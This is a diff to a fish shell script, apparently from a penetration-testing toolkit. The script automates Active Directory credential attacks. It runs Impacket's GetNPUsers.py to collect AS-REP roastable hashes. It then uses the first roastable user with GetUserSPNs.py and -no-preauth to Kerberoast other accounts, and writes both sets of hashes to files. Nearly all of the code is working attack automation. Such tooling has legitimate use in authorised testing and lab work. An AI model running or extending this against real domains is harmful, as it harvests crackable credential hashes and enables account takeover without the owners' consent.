@@ -245,47 +245,41 @@ Examples:
         
         ezpz_cmd "$getnpusers_cmd"
         set output ($getnpusers_cmd 2>&1)
-        set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
-        if test -n "$error_lines"
-            for line in $error_lines
-                echo $line | sed 's/^\[\-\] //'
+        set hash_lines (string split '\n' $output | grep '^\$krb5asrep\$')
+        
+        # Show and save hash lines if found
+        if test -n "$hash_lines"
+            for hash in $hash_lines
+                echo $hash
             end
-        else
-            echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
-            # Save hashes if any found
-            $getnpusers_cmd -request -outputfile $asrep_file >/dev/null 2>&1
-            if test -f $asrep_file
-                ezpz_info "Saving hashes to $asrep_file"
+            printf '%s\n' $hash_lines > $asrep_file
+            ezpz_info "Saving hashes to $asrep_file"
+            
+            # Extract first AS-REP roastable user for Kerberoasting
+            set asrep_user (echo $hash_lines[1] | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f3)
+            if test -n "$asrep_user"
+                ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
+                set kerb_file "$target"_kerb.hash
+                if test -n "$domain"
+                    set kerb_file "$domain"_kerb.hash
+                end
                 
-                # Extract first AS-REP roastable user for Kerberoasting
-                set asrep_user (head -1 $asrep_file | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f3)
-                if test -n "$asrep_user"
-                    ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
-                    set kerb_file "$target"_kerb.hash
-                    if test -n "$domain"
-                        set kerb_file "$domain"_kerb.hash
+                set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target"
+                if set -q _flag_kerb -a -n "$dc_fqdn"
+                    set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
+                end
+                
+                ezpz_cmd "$getuserspns_cmd"
+                set spn_output ($getuserspns_cmd 2>&1)
+                set spn_hash_lines (string split '\n' $spn_output | grep '^\$krb5tgs\$')
+                
+                # Show and save hash lines if found
+                if test -n "$spn_hash_lines"
+                    for hash in $spn_hash_lines
+                        echo $hash
                     end
-                    
-                    set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target"
-                    if set -q _flag_kerb -a -n "$dc_fqdn"
-                        set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
-                    end
-                    
-                    ezpz_cmd "$getuserspns_cmd"
-                    set spn_output ($getuserspns_cmd 2>&1)
-                    set spn_error_lines (string split '\n' $spn_output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
-                    if test -n "$spn_error_lines"
-                        for line in $spn_error_lines
-                            echo $line | sed 's/^\[\-\] //'
-                        end
-                    else
-                        echo $spn_output | grep --color=never "\\S" | tail -n +4 | awk '{print $2 " ||| "$1}' | column -s "|||" -t
-                        # Save hashes if any found
-                        $getuserspns_cmd -request -outputfile $kerb_file >/dev/null 2>&1
-                        if test -f $kerb_file
-                            ezpz_info "Saving hashes to $kerb_file"
-                        end
-                    end
+                    printf '%s\n' $spn_hash_lines > $kerb_file
+                    ezpz_info "Saving hashes to $kerb_file"
                 end
             end
         end
